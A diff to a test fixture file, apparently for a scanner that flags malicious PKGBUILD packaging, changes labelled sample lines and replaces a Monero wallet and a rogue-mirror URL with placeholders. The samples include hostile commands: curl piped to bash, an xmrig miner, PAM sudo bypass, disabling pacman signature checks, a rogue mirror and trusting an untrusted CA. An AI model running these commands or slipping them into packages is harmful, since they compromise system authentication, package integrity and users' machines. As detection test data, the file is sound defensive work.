@@ -3,7 +3,8 @@
 # (PKGBUILD top level), file (extra helper.sh), source / source-skip (an
 # extra source, real / SKIP sum), nosrcinfo (drop .SRCINFO), pkgbase,
 # heredoc / shheredoc (a `cat` / `sh` heredoc body in post_install).
-# @BLOB@ expands to a 120-char base64 run. path ("<relpath>::<content>"),
+# @BLOB@ expands to a 120-char base64 run, @XMR@ to a Monero address.
+# path ("<relpath>::<content>"),
 # sums (swap the sha256 algorithm, e.g. md5), srcinfo (a .SRCINFO-only line).
 named-pkg-install	+	build	npm install atomic-lockfile
 named-pkg-install	+	build	bun add js-digest
@@ -152,7 +153,7 @@ ld-preload-file	-	build	install -Dm644 x.so "$pkgdir/usr/lib/x.so"
 ld-preload	+	build	LD_PRELOAD=./hook.so ./configure
 ld-preload	-	build	export LD_LIBRARY_PATH="$srcdir/lib"
 miner	+	file	./xmrig -o stratum+tcp://pool.x.example:3333 -u w
-miner	+	build	W=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A
+miner	+	build	W=@XMR@
 miner	-	build	cmake -DWITH_STRATUM=OFF ..
 sudo-in-pkg	+	build	sudo make install
 sudo-in-pkg	-	build	install -Dm644 sudoers.5 "$pkgdir/usr/share/man/man5/"
@@ -170,7 +171,7 @@ pam-tamper	+	install	sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/sudo
 pam-tamper	-	build	install -Dm644 x.pam "$pkgdir/etc/pam.d/x"
 pacman-tamper	+	install	sed -i 's/Required/Never/' /etc/pacman.conf
 pacman-tamper	+	file	echo 'SigLevel = Never' >> x
-pacman-tamper	-	build	install -Dm644 x.hook "$pkgdir/usr/share/libalpm/hooks/x.hook"
+pacman-tamper	-	build	install -Dm644 x "$pkgdir/usr/share/libalpm/hooks/x.hook"
 keyring-tamper	+	install	pacman-key --lsign-key ABCD
 keyring-tamper	+	install	pacman-key -r ABCD
 keyring-tamper	-	build	echo "pacman-key is not needed"
@@ -230,7 +231,7 @@ pipe-to-shell	+	top	pkgdesc="x"; curl -s https://e.example/x | bash
 sudo-in-pkg	+	top	pkgdesc='x' && sudo cp x /usr/bin/x
 detach	-	top	pkgdesc="Run things with nohup" # plain, commented
 ca-trust	+	install	cp evil.crt /etc/ca-certificates/trust-source/anchors/
-pacman-tamper	+	install	echo 'Server = http://evil.example/$repo' >> /etc/pacman.d/mirrorlist
+pacman-tamper	+	install	echo 'Server = http://e.x/' >> /etc/pacman.d/mirrorlist
 pacman-tamper	+	install	cp x.conf /etc/pacman.d/x.conf
 pacman-tamper	-	build	grep -q Server /etc/pacman.d/mirrorlist
 pacman-tamper	-	install	cat /etc/pacman.conf
